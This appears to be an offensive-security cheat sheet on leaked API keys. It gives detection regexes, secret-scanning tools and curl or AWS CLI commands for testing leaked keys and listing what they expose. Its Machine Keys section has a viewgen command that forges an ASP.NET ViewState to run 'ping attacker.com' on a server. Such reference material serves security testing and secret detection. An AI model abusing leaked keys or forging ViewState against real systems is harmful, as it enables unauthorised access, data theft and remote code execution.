# API Key Leaks

> API keys are secret tokens used to authenticate requests to APIs. When exposed in source code, configuration files, or public repositories, they can be exploited by attackers to access sensitive services, incur costs, or exfiltrate data.

## Summary

- [Tools](#tools)
- [Exploit](#exploit)
  - [AWS Access Key](#aws-access-key)
  - [GitHub Token](#github-token)
  - [Google API Key](#google-api-key)
  - [Slack Token](#slack-token)
  - [Stripe API Key](#stripe-api-key)
  - [Twilio API Key](#twilio-api-key)
  - [SendGrid API Key](#sendgrid-api-key)
  - [MailChimp API Key](#mailchimp-api-key)
- [Detection Patterns](#detection-patterns)
- [Machine Keys](#machine-keys)

## Tools

- [truffleHog](https://github.com/trufflesecurity/trufflehog) - Searches through git repositories for secrets
- [gitleaks](https://github.com/gitleaks/gitleaks) - SAST tool for detecting secrets in git repos
- [detect-secrets](https://github.com/Yelp/detect-secrets) - Detecting secrets within a codebase
- [git-secrets](https://github.com/awslabs/git-secrets) - Prevents committing secrets to git repos
- [secretscanner](https://github.com/deepfence/SecretScanner) - Find secrets and passwords in container images

## Exploit

### AWS Access Key

Pattern: `AKIA[0-9A-Z]{16}`

```bash
# Verify the key
aws sts get-caller-identity --access-key-id AKIAIOSFODNN7EXAMPLE --secret-access-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# List S3 buckets
aws s3 ls

# List IAM users
aws iam list-users
```

### GitHub Token

Pattern: `ghp_[0-9a-zA-Z]{36}` (Personal Access Token)

```bash
# Check token validity
curl -H "Authorization: token TOKEN_HERE" https://api.github.com/user

# List repositories
curl -H "Authorization: token TOKEN_HERE" https://api.github.com/user/repos

# List organizations
curl -H "Authorization: token TOKEN_HERE" https://api.github.com/user/orgs
```

### Google API Key

Pattern: `AIza[0-9A-Za-z\-_]{35}`

```bash
# Test key validity
curl "https://maps.googleapis.com/maps/api/geocode/json?address=1600+Amphitheatre+Parkway&key=YOUR_API_KEY"

# Check enabled APIs
curl "https://www.googleapis.com/discovery/v1/apis?key=YOUR_API_KEY"
```

### Slack Token

Pattern: `xox[baprs]-([0-9a-zA-Z]{10,48})`

```bash
# Test token
curl -H "Authorization: Bearer xoxb-TOKEN" https://slack.com/api/auth.test

# List channels
curl -H "Authorization: Bearer xoxb-TOKEN" https://slack.com/api/conversations.list
```

### Stripe API Key

Pattern: `sk_live_[0-9a-zA-Z]{24}`

```bash
# Check balance
curl https://api.stripe.com/v1/balance -u sk_live_KEY:

# List customers
curl https://api.stripe.com/v1/customers -u sk_live_KEY:
```

### Twilio API Key

Pattern: `SK[0-9a-fA-F]{32}`

```bash
# List accounts
curl -G https://api.twilio.com/2010-04-01/Accounts.json \
  -u ACCOUNT_SID:AUTH_TOKEN
```

### SendGrid API Key

Pattern: `SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}`

```bash
# Verify key
curl -H "Authorization: Bearer SG.KEY_HERE" https://api.sendgrid.com/v3/user/profile
```

### MailChimp API Key

Pattern: `[0-9a-f]{32}-us[0-9]{1,2}`

```bash
# Get account info
curl -u "anystring:KEY_HERE" https://usX.api.mailchimp.com/3.0/
```

## Detection Patterns

| Service | Regex Pattern |
|---------|---------------|
| AWS Access Key ID | `AKIA[0-9A-Z]{16}` |
| AWS Secret Key | `[0-9a-zA-Z/+]{40}` |
| GitHub PAT | `ghp_[0-9a-zA-Z]{36}` |
| GitHub OAuth | `gho_[0-9a-zA-Z]{36}` |
| Google API Key | `AIza[0-9A-Za-z\-_]{35}` |
| Slack Bot Token | `xoxb-[0-9]{11}-[0-9]{11}-[0-9a-zA-Z]{24}` |
| Stripe Live Key | `sk_live_[0-9a-zA-Z]{24}` |
| Stripe Test Key | `sk_test_[0-9a-zA-Z]{24}` |
| Twilio API Key | `SK[0-9a-fA-F]{32}` |
| SendGrid API Key | `SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}` |
| MailChimp | `[0-9a-f]{32}-us[0-9]{1,2}` |
| RSA Private Key | `-----BEGIN RSA PRIVATE KEY-----` |
| SSH Private Key | `-----BEGIN OPENSSH PRIVATE KEY-----` |

## Machine Keys

ASP.NET Machine Keys can be used to forge authentication cookies, ViewState, and other signed/encrypted data.

See [Files/MachineKeys.txt](Files/MachineKeys.txt) for a list of known/leaked machine keys.

```xml
<!-- Example vulnerable web.config -->
<machineKey
  validationKey="FOUND_VALIDATION_KEY"
  decryptionKey="FOUND_DECRYPTION_KEY"
  validation="SHA1"
  decryption="AES"
/>
```

Use [Machina](https://github.com/0xacb/viewgen) or `ysoserial.net` to exploit leaked machine keys:

```bash
# Generate malicious ViewState with leaked machine key
python3 viewgen.py --webconfig web.config -m UAT -c "ping attacker.com"
```

## References

- [KeyHacks - streaak](https://github.com/streaak/keyhacks)
- [API Key Checker - daffainfo](https://github.com/daffainfo/all-about-apikey)
- [Exposed AWS Keys - Truffle Security](https://trufflesecurity.com/blog/exposed-aws-keys)
